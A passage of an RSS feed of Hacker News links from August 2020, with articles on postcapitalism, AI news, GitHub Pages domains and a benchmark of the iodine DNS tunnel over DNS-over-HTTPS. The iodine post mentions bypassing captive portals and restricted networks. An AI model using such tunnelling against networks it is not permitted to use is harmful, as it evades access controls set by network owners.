<p>Keep in mind, a few days ago <a href="https://nintendosmash.com/nintendo-wants-you-to-use-2-step-verification-to-prevent-unauthorized-log-in-to-your-account/">Nintendo advised us to set a 2-step verification method</a>. This is the only way we can secure our account.</p>

 
















<!-- AI CONTENT END 3 -->
					
									</div><!-- .entry /-->
				
				
				 <!-- .share-post -->				
			</div><!-- .post-inner -->
		</article><section id="check-also-box">
		<a href="#" id="check-also-close"><i></i></a>

		<p>
			<h3>Check Also</h3>
		</p>

				<div>
						
			<p><a href="https://nintendosmash.com/rumor-points-to-a-new-nintendo-direct-for-next-week/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/03/direct-1-310x165.jpg" alt="Rumor points to a new Nintendo Direct for next week">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/rumor-points-to-a-new-nintendo-direct-for-next-week/" rel="bookmark">Rumor points to a new Nintendo Direct for next week</a></h2>
			<p>It seems that the rumors of Nintendo Direct continue to circulate. In the last few …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/king-zell-claims-that-zelda-skyward-sword-hd-is-coming-to-nintendo-switch/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/zelda-skyword-310x165.jpg" alt="King Zell claims that Zelda: Skyward Sword HD is coming to Nintendo Switch">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/king-zell-claims-that-zelda-skyward-sword-hd-is-coming-to-nintendo-switch/" rel="bookmark">King Zell claims that Zelda: Skyward Sword HD is coming to Nintendo Switch</a></h2>
			<p>In recent days, a rumor has been circulating the network that Zelda: Skyward Sword was …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/famous-granny-audie-shows-us-her-animal-crossing-new-horizons-island/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/animal-crossing-granny-island-310x165.jpg" alt="FAMOUS GRANNY AUDIE SHOWS US HER ANIMAL CROSSING: NEW HORIZONS ISLAND">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/famous-granny-audie-shows-us-her-animal-crossing-new-horizons-island/" rel="bookmark">FAMOUS GRANNY AUDIE SHOWS US HER ANIMAL CROSSING: NEW HORIZONS ISLAND</a></h2>
			<p>Animal Crossing fans may remember Audrey, the 89-year-old grandmother who has famously clocked more than …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/crysis-remastered-coming-to-pc-and-consoles-on-september-18/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/04/crysis-for-the-switch-310x165.jpg" alt="Crysis Remastered Coming To PC And Consoles On September 18">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/crysis-remastered-coming-to-pc-and-consoles-on-september-18/" rel="bookmark">Crysis Remastered Coming To PC And Consoles On September 18</a></h2>
			<p>Crytek not only announced the release date of the remaster, but also a teaser comparing …</p>
		</div>
			</section></div>]]>
            </description>
            <link>https://nintendosmash.com/hackers-can-get-the-paypal-information-via-your-linked-nintendo-accounts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247191</guid>
            <pubDate>Sat, 22 Aug 2020 20:56:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monoliths vs. Microservices for Junior Engineers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246991">thread link</a>) | @sciencewolf
<br/>
August 22, 2020 | https://algodaily.com/lessons/monoliths-vs-microservices-for-junior-engineers?view=article | <a href="https://web.archive.org/web/*/https://algodaily.com/lessons/monoliths-vs-microservices-for-junior-engineers?view=article">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://algodaily.com/lessons/monoliths-vs-microservices-for-junior-engineers?view=article</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246991</guid>
            <pubDate>Sat, 22 Aug 2020 20:24:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the pandemic has sped up the passage to postcapitalism]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246845">thread link</a>) | @headalgorithm
<br/>
August 22, 2020 | https://www.yanisvaroufakis.eu/2020/08/21/something-remarkable-just-happened-this-august-how-the-pandemic-has-sped-up-the-passage-to-postcapitalism-lannan-institute-virtual-talk/ | <a href="https://web.archive.org/web/*/https://www.yanisvaroufakis.eu/2020/08/21/something-remarkable-just-happened-this-august-how-the-pandemic-has-sped-up-the-passage-to-postcapitalism-lannan-institute-virtual-talk/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<article id="post-22781">

		<section>
			

			<h2>Two days ago, something extraordinary happened. Something that has never happened before in the history of capitalism. In Britain, the news came out that the economy had suffered its greatest slump ever – more than 22% down during the first 7 months of 2020. Remarkably, on the same day, the London Stock Exchange, the FTSE100 index, rose by more than 2%. On the same day, during a time America has ground to a halt and is beginning to look like not just as an economy in deep trouble but also, ominously, as a failed state, Wall Street’s SP500 index hit an all-time record.</h2>
<h3>Unable to contain myself, I tweeted the following:</h3>
<blockquote data-width="500" data-dnt="true">
<p lang="en" dir="ltr">Financial capitalism has decoupled from the capitalist economy, skyrocketing out of Earth's orbit, leaving behind it broken lives &amp; dreams. As the UK sinks into the worst recession ever, &amp; US edges toward failed state status, FTSE100 goes up 2% &amp; S&amp;P500 breaks all time record!</p>
<p>— Yanis Varoufakis (@yanisvaroufakis) <a href="https://twitter.com/yanisvaroufakis/status/1293624708307574789?ref_src=twsrc%5Etfw">August 12, 2020</a></p></blockquote>




<h3>Before 2008, the money markets also behaved in a manner that defied humanism. News of mass firings of workers would be routinely followed by sharp rises in the share price of the companies “letting their workers go” – as if they were concerned with their liberation… But at least, there was a capitalist logic to that correlation between firings and share prices. That disagreeable causality was anchored in expectations regarding a company’s actual profits. More precisely, the prediction that a reduction in the company’s wage bill might, to the extent that the loss of personnel lead to lower proportional reductions in output, lead to a rise in profits and, thus, dividends. The mere belief that there were enough speculators out there thinking that there were enough speculators out there who might form that particular expectation was enough to occasion a boost in the share price of companies firing workers.</h3>
<h3>That was then, prior to 2008. Today, this link between profit forecasts and share prices has disappeared and, as a consequence, the share market’s misanthropy has entered a new, post-capitalist phase. This is not as controversial a claim as it may sound at first. In the midst of our current pandemic not one person in their right mind imagines that there are speculators out there who believe that there are enough speculators out there who may believe that company profits in the UK or in the US will rise any time soon. And yet they buy shares with enthusiasm. The pandemic’s effect on our post-2008 world is now creating forces hitherto unfathomable.</h3>
<h3>In today’s world, it would be a mistake to try to find any correlation between what is going on in the real world (of wages, profits, output and sales) and in the money markets. Today, there is no need for a correlation between ‘news’ (e.g. a newsflash that some large multinational fired tens of thousands) and share price hikes. As we watch stock exchanges rise at a time of tanking economies, it would be a mistake to think that speculators hear that the UK economy, or the US economy, have tanked and think to themselves: Great, let’s buy shares. No, the situation is far, far worse!</h3>
<h3>In the post-2008 world, speculators – for the first time in history – don’t actually give a damn about the economy. They, like you and me, can see that Covid-19 has put capitalism in suspended animation. That it is crushing corporate profit margins while also the destroying lives and livelihoods of the many. That it is causing a new tsunami of poverty with long-term effects on aggregate demand. That it demonstrates in every country and every town the pre-existing deep class and race divides, as some of us were privileged enough to keep social distance rules while an army of people out there laboured for a pittance and at risk of infection to cater to our needs.</h3>
<h3>No, what we are living through now is not your typical capitalist disregard for human needs, the standard tendency of the capitalist system to be motivated solely by the needs of profit-maximisation or, as we lefties say, capital accumulation. No, capitalism is now in a new, strange phase: Socialism for the very, very few (courtesy of central banks and governments catering to a tiny oligarchy) and stringent austerity, coupled with cruel competition in an environment of industrial, and technologically advanced, feudalism for almost everyone else.</h3>
<h3>This week’s events in Wall Street and the City of London mark this turning point – the historic moment that future historians will undoubtedly pick to say: It was in the summer of 2020 when financial capitalism finally broke with the world of real people, including capitalists antiquated enough to try to profit from producing goods and services.</h3>
<h3>But let us begin at the beginning. How did it all begin?</h3>
<h3>Before capitalism, debt appeared at the very end of the economic cycle; a mere reflection of the power to accumulate already produced surpluses. Under feudalism,</h3>
<ul>
<li>
<h3>production came first with the peasants working the land to plant and harvest crops.</h3>
</li>
<li>
<h3>Distribution followed the harvest, as the sheriff collected the lord’s share. Part of this share was later monetised when the lord’s men sold it at some market.</h3>
</li>
<li>
<h3>Debt only emerged at the very last stage of the cycle when the lord would lend his money to debtors, the King often amongst them.</h3>
</li>
</ul>
<h3>Capitalism reversed the order. Once labour and land had been commodified, debt was necessary before production even began. Landless capitalists had to borrow to lease workers, land and machines. Only then could production begin, yielding revenues whose residual claimant were the capitalists. Thus, debt powered capitalism’s early oeuvre. However, it took the second industrial revolution before capitalism could re-shape the world in its image.</h3>
<h3>The invention of electromagnetism, on the back of James Clerk Maxwell’s famous equations, gave rise to the first networked company, Edison for example that produced everything from the power generation stations and the electricity grid to the light bulb in every house. The funding needed to build these megafirms was, naturally, beyond the limits of the small banks of the 19<sup>th</sup> century. Thus, the megabank was born, as a result of mergers and acquisitions, along with a remarkable capacity to create money out of thin air. The agglomeration of these megafirms and megabanks created a new Technostructure that usurped markets, democracies and the mass media. The roaring 1920s, leading to the crash of 1929, was the result.</h3>
<h3>From 1933 to 1971, global capitalism was centrally managed and planned under different versions of the New Deal, that included the War Economy and the Bretton Woods system. Following the demise of Bretton Woods in the early 1970s, capitalism returned to a version of the 1920s: Under the ideological guise of neoliberalism (which was neither new nor liberal), the Technostructure again took over from governments. Our generation’s 1929, that happened in 2008 was the result.</h3>
<h3>Following the crash of 2008, capitalism changed drastically. In their attempt to re-float the crashed financial system, central banks channelled rivers of cheap debt-money to the financial sector, in exchange for universal fiscal austerity that limited the middle and lower classes’ demand for goods and services. Unable to profit from austerity-hit consumers, corporations and financiers were hooked up to the central banks’ constant drip-feed of fictitious debt.</h3>
<h3>Every time the Fed or the European Central Bank or the Bank of England pumped more money into the commercial banks, in the hope that these monies would be lent to companies which would in turn create new jobs and product lines, the birth of the strange world we now live in came a little closer. How? As an example, consider the following chain reaction: The European Central Bank extended new liquidity to Deutsche Bank. Deutsche Bank could only profit from it if it found someone to borrow this money. Dedicated to the banker’s mantra “never lend to someone who needs the money”, Deutsche Bank would never lend it to the “little people”, whose circumstances were increasingly diminished (along with their ability to repay any substantial loans), it preferred to lend it to, say, Volkswagen. But, in turn, Volkswagen executives looked at the “little people” out there and thought to themselves: “Their circumstances are diminishing, they won’t be able to afford new, high quality electric cars.” And so Volkswagen postponed crucial investments in new technologies and in new high quality jobs. But, Volkswagen executives would have been remiss not to take the dirt-cheap loans offered by Deutsche Bank. So, they took it. And what did they do with the freshly minted ECB-monies? They used it to buy Volkswagen shares in the stock exchange. The more of those shares they bought the higher Volkswagen’s share value. And since the Volkswagen executives’ salary bonuses were linked to the company’s share value, they profited personally – while, at once, the ECB’s firepower was well and truly wasted from society’s, and indeed from industrial capitalism’s, point of view.</h3>
<h3>This was the process by which, from 2008 to 2020, the policies to re-float the banking sector from 2009 onwards resulted in the almost complete zombification of corporations. Covid-19 found capitalism in this zombified state. With consumption and production hit massively and at once, governments were forced to step into the void to replace all incomes to a gargantuan extent at a time the real capitalist economy has the least capacity to generate real wealth. The decoupling of the financial markets from the real economy, that was the trigger for this talk, is a sure sign that something we may defensibly label postcapitalism is already underway.</h3>
<h3>My difference with fellow lefties is that I do not believe there is <em>any</em> guarantee that what follows capitalism – let’s call it, for want of a better term, postcapitalism – will be better. It may well be utterly dystopic, judging by present phenomena. In the …</h3></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.yanisvaroufakis.eu/2020/08/21/something-remarkable-just-happened-this-august-how-the-pandemic-has-sped-up-the-passage-to-postcapitalism-lannan-institute-virtual-talk/">https://www.yanisvaroufakis.eu/2020/08/21/something-remarkable-just-happened-this-august-how-the-pandemic-has-sped-up-the-passage-to-postcapitalism-lannan-institute-virtual-talk/</a></em></p>]]>
            </description>
            <link>https://www.yanisvaroufakis.eu/2020/08/21/something-remarkable-just-happened-this-august-how-the-pandemic-has-sped-up-the-passage-to-postcapitalism-lannan-institute-virtual-talk/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246845</guid>
            <pubDate>Sat, 22 Aug 2020 20:02:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Last Week in AI News Digest: hate speech, dogfights, disasters, and more]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246540">thread link</a>) | @andreyk
<br/>
August 22, 2020 | https://www.skynettoday.com/digests/the-seventy-ninth | <a href="https://web.archive.org/web/*/https://www.skynettoday.com/digests/the-seventy-ninth">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>        
      
      
      <h4>Detecting hate speech, dogfight simulation, disaster-response, and more!</h4>
      
      </div><div>
      <h3 id="mini-briefs">Mini Briefs</h3>

<h4 id="facebooks-ai-for-detecting-hate-speech-is-facing-its-biggest-challenge-yet"><a href="https://www.fastcompany.com/90539275/facebooks-ai-for-detecting-hate-speech-is-facing-its-biggest-challenge-yet">Facebook’s AI for detecting hate speech is facing its biggest challenge yet</a></h4>
<p>Facebook has made significant progress recently to proactively take down content that violate its community standards.
For example, in the second quarter of 2020, Facebook took down 104.6 million pieces of content.
While reviews are typically performed by a vast workforce of human moderators, AI-powered tools have enabled Facebook to do this work at a greater scale for textual content.</p>

<p>However, there’s a long way to go for these systems to match or exceed the capabilities of human moderators.
This is because a large proportion of hate speech and misinformation is in the form of images and memes, and reasoning about the context and language-image interplay is an extremely difficult challenge for AI.</p>

<blockquote>
  <p>Given Facebook’s scale and the speed at which some use it to spread hate, incite violence, and share lies with millions, Facebook will have to keep running to catch up.</p>
</blockquote>

<h4 id="ai-slays-top-f-16-pilot-in-darpa-dogfight-simulation"><a href="https://breakingdefense.com/2020/08/ai-slays-top-f-16-pilot-in-darpa-dogfight-simulation/">AI Slays Top F-16 Pilot In DARPA Dogfight Simulation</a></h4>

<p>The Defense Advanced Research Project Agency (DARPA) recently hosted a simulated F16 dogfight competition, with different AI bots competing with each other as well as with human pilots.
The top AI bot was able to beat a human pilot 5-0 in the simulated contest.
DARPA started this program “as a risk-reduction effort […] to flesh out how human and machine pilots share operational control of a fighter jet to maximize its chances of mission success.”
Competition runners are broadly optimistic about the demonstration of AI capabilities, even if they are not close to being deployed on a real aircraft.
Of concern, the program had little discussion on the ethics of AI military applications, especially with the lethal autonomous weapon systems being considered.</p>

<h3 id="podcast">Podcast</h3>

<p>Check out our weekly podcast covering these stories!
<a href="https://aitalk.podbean.com/">Website</a> |
<a href="https://feed.podbean.com/aitalk/feed.xml">RSS</a> | 
<a href="https://podcasts.apple.com/us/podcast/lets-talk-ai/id1502782720">iTunes</a> |
<a href="https://open.spotify.com/show/17HiNdxcoKJLLNibIAyUch">Spotify</a> | 
<a href="https://www.youtube.com/channel/UCKARTq-t5SPMzwtft8FWwnA">YouTube</a></p>


<h3 id="news">News</h3>
<h4 id="advances--business">Advances &amp; Business</h4>

<ul>
  <li>
    <p><a href="https://www.wsj.com/articles/microsoft-energy-dept-to-develop-disaster-response-ai-tools-11597755601">Microsoft, Energy Dept. to Develop Disaster-Response AI Tools</a> - The U.S. Department of Energy and Microsoft Corp. on Tuesday announced a partnership to develop artificial-intelligence tools aimed at helping first-responders better react to fast-changing natural events, such as floods and wildfires.</p>
  </li>
  <li>
    <p><a href="https://www.bbc.com/news/uk-wales-53765451">Coronavirus: Robot CERi is a bilingual Covid-19 expert</a> - Ceri is bilingual, clued-up on coronavirus and can tell what mood you are in. Ceri also happens to be a robot.</p>
  </li>
  <li>
    <p><a href="https://www.healthcareitnews.com/news/europe/moscow-doh-uses-ai-platform-detect-lung-cancer-symptoms">Moscow DOH uses AI platform to detect lung cancer symptoms</a> - Moscow’s department of health is using an artificial intelligence (AI) platform to detect symptoms of lung cancer in CT scans, as part of a project to implement AI technology for radiology.</p>
  </li>
  <li>
    <p><a href="https://techxplore.com/news/2020-08-scientists-artificial-intelligence-high-precision.html">Scientists develop artificial intelligence system for high precision recognition of hand gestures</a> - The recognition of human hand gestures by AI systems has been a valuable development over the last decade and has been adopted in high-precision surgical robots, health monitoring equipment and in gaming systems.</p>
  </li>
  <li>
    <p><a href="https://www.latimes.com/business/technology/story/2020-08-14/facial-recognition-payment-technology">Forget credit cards - now you can pay with your face. Creepy or cool?</a> - A new way to pay has arrived in Los Angeles: your face.</p>
  </li>
  <li>
    <p><a href="https://www.jamesyu.org/singular/">Singular</a> - A collection of stories about AI and singularity co-written by a human and GPT-3</p>
  </li>
</ul>

<h4 id="concerns--hype">Concerns &amp; Hype</h4>

<ul>
  <li>
    <p><a href="https://www.vox.com/recode/2020/8/14/21365300/artificial-intelligence-ai-school-reopening-technology-covid-19">The dystopian tech that companies are selling to help schools reopen sooner</a> - This fall, AI could be watching students social distance and checking their masks. Thousands of schools nationwide will not be reopening this fall.</p>
  </li>
  <li>
    <p><a href="https://gothamist.com/news/nypd-used-facial-recognition-unit-in-siege-of-black-lives-matter-activists-apartment?amp=1">NYPD Used Facial Recognition Technology In Siege Of Black Lives Matter Activist’s Apartment</a> - The NYPD deployed facial recognition technology in its hunt for a prominent Black Lives Matter activist, whose home was besieged by dozens of officers and police dogs last week, a spokesperson confirmed to Gothamist.</p>
  </li>
  <li>
    <p><a href="https://www.technologyreview.com/2020/08/13/1006573/digital-psychiatry-phenotyping-schizophrenia-bipolar-privacy/">Machines can spot mental health issues - if you hand over your personal data</a> - Digital diagnosis could transform psychiatry by mining your most intimate data for clues. But is the privacy cost worth it?</p>
  </li>
  <li>
    <p><a href="https://foundation.mozilla.org/en/blog/supporting-black-artists-who-are-examining-ai/">Supporting Black Artists Who Are Examining AI</a> - Technology has a complicated relationship with racial justice. Smartphones, internet platforms, and other digital tools can be used to document and expose racism. But digital tools can also fuel racism: smart doorbells surveil Black individuals.</p>
  </li>
  <li>
    <p><a href="https://www.theguardian.com/education/2020/aug/17/a-levels-gcse-results-england-based-teacher-assessments-government-u-turn">A-level and GCSE results in England to be based on teacher assessments in U-turn</a> - All A-level and GCSE results in England will be based on grades assesed by teachers instead of algorithms.</p>
  </li>
</ul>

<h4 id="analysis--policy">Analysis &amp; Policy</h4>

<ul>
  <li>
    <p><a href="https://pagestlabs.substack.com/p/gpt-3-turks-gambit-and-the-question">GPT-3 and The Question of Automation</a> - Automation is not an all or nothing proposition. An AI model’s automation capability is highly conjoined with the task and application it is used in.</p>
  </li>
  <li>
    <p><a href="https://onezero.medium.com/an-a-i-movie-service-could-one-day-serve-you-a-new-custom-film-every-time-241395352821">An A.I. Movie Service Could One Day Serve You a New Custom Film Every Time</a> - How long will it be until an A.I. can make an actual feature film on demand?</p>
  </li>
  <li>
    <p><a href="https://askell.io/posts/2020/08/fairness-and-predictive-equality">Fairness, evidence, and predictive equality</a> - How the causal fairness principle relates to predictive equality</p>
  </li>
  <li>
    <p><a href="https://venturebeat.com/2020/08/17/how-robotics-and-automation-could-create-new-jobs-in-the-new-normal/">How robotics and automation could create new jobs in the new normal</a> - Depending on who you ask, AI and automation will either destroy jobs or create new ones. In reality, a greater push toward automation will probably both kill and create jobs - human workers will become redundant in certain spheres, sure, but many new roles will likely crop up.</p>
  </li>
</ul>

<h4 id="expert-opinions--discussion-within-the-field">Expert Opinions &amp; Discussion within the field</h4>

<ul>
  <li><a href="https://www.technologyreview.com/2020/08/18/1007196/ai-research-machine-learning-applications-problems-opinion/#Echobox=1597721504">Too many AI researchers think real-world problems are not relevant</a> - The community’s hyperfocus on novel methods ignores what’s really important.</li>
</ul>

<hr>

<p>That’s all for this week! If you are not subscribed and liked this, feel free to subscribe below!</p>

    </div></div>]]>
            </description>
            <link>https://www.skynettoday.com/digests/the-seventy-ninth</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246540</guid>
            <pubDate>Sat, 22 Aug 2020 19:20:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Extrablatt – customizable news article scraping in Rust and WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246484">thread link</a>) | @matsche
<br/>
August 22, 2020 | https://mattsse.github.io/extrablatt/?url=https://www.nytimes.com/2020/08/21/technology/palantir-ipo-580-million-loss.html | <a href="https://web.archive.org/web/*/https://mattsse.github.io/extrablatt/?url=https://www.nytimes.com/2020/08/21/technology/palantir-ipo-580-million-loss.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mattsse.github.io/extrablatt/?url=https://www.nytimes.com/2020/08/21/technology/palantir-ipo-580-million-loss.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246484</guid>
            <pubDate>Sat, 22 Aug 2020 19:13:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance of Iodine over DNS-over-HTTPS]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246443">thread link</a>) | @ZnZirconium
<br/>
August 22, 2020 | https://0day.work/performance-of-iodine-over-dns-over-https/ | <a href="https://web.archive.org/web/*/https://0day.work/performance-of-iodine-over-dns-over-https/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        <header>
        


        </header>

        <section>
            <!--kg-card-begin: markdown--><p><a href="https://code.kryo.se/iodine/">Iodine</a> is a DNS-tunnel that can be used to send TCP traffic encapsulated in DNS queries. Sometimes, this helps to bypass captive portals or otherwise restricted networks.</p>
<p>In this blogpost I'll test the performance of using Iodine in combination with <a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DoH (DNS-over-HTTPS)</a>.</p>
<!-- more -->  
<p>For my test setup, I spun up a vanilla debian VM using vagrant and installed iodine in it. I have an iodine server running on one of my servers, but I won't cover the steps to install and configure it here, because <a href="https://0day.work/tunneling-all-traffic-over-dns-with-a-socks-proxy/">I already wrote a post about it</a>.</p>

<p>Before we start experimenting with DNS-over-HTTPS, let's measure the baseline performance of the DNS tunnel. For the measurements I used the TCP-based network throughput testing tool <a href="https://iperf.fr/">iperf</a>.</p>
<h2 id="rawmode">Raw mode</h2>
<p>Iodine has a raw mode - and if I understood it correctly - it sends the DNS traffic directly to the iodine DNS server, without going through the DNS resolver. That allows for quite a high bandwidth:</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-raw.png" alt="Iodine raw connection"></p>
<p>As you can see, we can easily push more than 50mbit/s through the tunnel. Not too bad, I think.</p>
<h2 id="querymode">Query mode</h2>
<p>So in essence, using the raw mode is kinda cheating, because usually - at least with captive portals - a specific DNS resolver is enforced at the network level and we cannot simply bypass it.<br>
With that limitation in place, iodine has to send a lot of small DNS queries to transfer our traffic.</p>
<p>As we can see below, the initialisation phase gets longer, because iodine tries to figure out the best query type and maximum fragment size to use.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-query.png" alt="Iodine query connection 1"></p>
<p><img src="https://0day.work/content/images/2019/02/iodine-query2.png" alt="Iodine query connection 2"></p>
<p>The bandwidth went down from 50 mbit/s to only around 350 - 450 <strong>kbit/s</strong>.  That does not sound much, but ~ 50 kb/s might still be enough to slowly download a document at an airport or check one's emails in an emergency, but won't be enough to watch YouTube videos.</p>

<p><a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DoH (DNS-over-HTTPS)</a> is a technique where DNS queries are not send in plaintext via UDP to DNS servers. Instead, the queries are send using TLS-encrypted HTTPS requests to special DoH API servers. For example, <a href="https://developers.cloudflare.com/1.1.1.1/dns-over-https/">Cloudflare operates such a server</a>.</p>
<p>You can use <code>curl</code> to resolve the A record for <code>0day.work</code> like this:</p>
<pre><code>$&gt; curl --silent -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=0day.work&amp;type=A' | js-beautify
{
    "Status": 0,
    "TC": false,
    "RD": true,
    "RA": true,
    "AD": false,
    "CD": false,
    "Question": [{
        "name": "0day.work.",
        "type": 1
    }],
    "Answer": [{
        "name": "0day.work.",
        "type": 1,
        "TTL": 10789,
        "data": "185.26.156.49"
    }]
}
</code></pre>
<h2 id="dnscryptproxy">dnscrypt-proxy</h2>
<p><a href="https://github.com/jedisct1/dnscrypt-proxy/">dnscrypt-proxy</a> is a tool written in Go that can act as a local DNS resolver which transparently forwards the DNS queries to a DoH server.</p>
<p>The setup is quite straight forward: Simply download one of the pre-built <a href="https://github.com/jedisct1/dnscrypt-proxy/releases">releases packages</a>, rename the <code>example-dnscrypt-proxy.toml</code> to <code>dnscrypt-proxy.toml</code> and then run <code>sudo ./dnscrypt-proxy</code>. But before that, I changed <code>dnscrypt_servers = true</code> to <code>false</code>, so that the proxy will only use DoH to resolve the DNS queries.</p>
<p><img src="https://0day.work/content/images/2019/02/dnscrypt-resolv.png" alt="dnscrypt running and changed /etc/resolv.conf"><br>
Now we only have to tell our system to use the dnscrypt-proxy as its resolver. For that, we comment out all lines in <code>/etc/resolv.conf</code> and add <code>nameserver 127.0.0.1</code>, because the proxy bound itself to port 53. All queries from our system will go towards our dnscrypt proxy.</p>
<p>A test query using the tool <code>dig</code> shows that the proxy works and we can resolve DNS records over DoH:<br>
<img src="https://0day.work/content/images/2019/02/dnscrypt-dig.png" alt="dnscrypt DNS query test"></p>
<h2 id="iodineanddoh">Iodine and DoH</h2>
<p>Let's get to the interesting part: The performance of Iodine over the DoH-based DNS resolver.</p>
<p>Spoiler: It is terrible :-( It also took me multiple tries until iodine managed to setup the tunnel.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-dnscrypt.png" alt="Iodine performance over DoH 1"></p>
<p>In the lower part of the screenshot you can see that <code>tshark</code> does not capture any packets going out over port 53. That means that iodine is really using the dnscrypt-proxy.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-dnscrypt2.png" alt="Iodine performance over DoH 2"></p>
<p>We can also see that iodine throws several errors/warnings and complains about server's replies.</p>
<p>In the end we have only between 30 - 90 kbit/s. I have not tried starting a SSH session or something else. Maybe mosh might somewhat work, but I do not believe that using iodine over DoH is a pleasant experience in general.</p>
<p>To be honest, it does not surprise me at all, because each DNS query that iodine sends is a separate HTTPS request and as you might have seen in the first dnscrypt screenshot, the average RTT is between 18ms - 78ms.</p>
<p>-=-</p>
<!--kg-card-end: markdown-->
        </section>

        

    </article>
    
</div></div>]]>
            </description>
            <link>https://0day.work/performance-of-iodine-over-dns-over-https/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246443</guid>
            <pubDate>Sat, 22 Aug 2020 19:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to set up a custom domain on GitHub Pages for free]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246414">thread link</a>) | @stin23
<br/>
August 22, 2020 | https://austinrepp.com/githubpagescustomdomain/ | <a href="https://web.archive.org/web/*/https://austinrepp.com/githubpagescustomdomain/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
            

            <div id="container">


<div>
    <article itemscope="" itemtype="http://schema.org/BlogPosting">
        

        <div itemprop="articleBody">
    

    <p>For this tutorial I will be assuming you have already setup a site on Github Pages that’s being run on the standard <code>USERNAME.github.io</code> domain. If you haven’t done so, a quick Google search will yield lots of articles explaining the process. I’m using Bluehost as my domain provider, but the steps should be similar for any major domain provider.</p>
<h2 id="setup-in-github-repository">Setup in Github repository</h2>
<p>In your Github repo for the site, navigate to the “Settings” tab. Scroll down and you will find an area for Github Pages setup. In the Custom Domain section, enter the domain name you want to use and click save.
<img src="https://i.imgur.com/UEKZ7VS.png" alt="Github Domain">
If you’re using a static site generator, you may already have a file in your repo called CNAME. If you don’t, you can create one. Inside this file, place the domain name. 
<img src="https://i.imgur.com/NQKTehC.png" alt="CNAME"></p>
<h2 id="host-record-setup">Host record setup</h2>
<p>Now open the domain provider that you are using, and navigate to the DNS section for the domain you are interested in using.</p>
<p>First you will need to add four A host records. The host record for each of these is “@”. The image below shows what it looks like on Bluehost. 
<img src="https://i.imgur.com/3B5bev3.png" alt="A host">
The four IP addresses (at the time of writing this) for each record to be added are:</p>
<ul>
<li>185.199.108.153</li>
<li>185.199.109.153</li>
<li>185.199.110.153</li>
<li>185.199.111.153</li>
</ul>
<p>Next, we need to add a CNAME record for the www site record. This will be in the format <code>USERNAME.github.io</code>
<img src="https://i.imgur.com/P3zGhXl.png" alt="CNAME"></p>
<p>That’s it! The records will probably take some time to update, so be patient. After they update you should see your site live on the domain you’ve provided.</p>

</div>

        

        
    </article>
</div>

            </div>
        </div></div>]]>
            </description>
            <link>https://austinrepp.com/githubpagescustomdomain/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246414</guid>
            <pubDate>Sat, 22 Aug 2020 19:05:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How a Kubernetes pod gets an IP address]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24246373">thread link</a>) | @ronaknnathani
<br/>
August 22, 2020 | https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/ | <a href="https://web.archive.org/web/*/https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of the core requirements of the
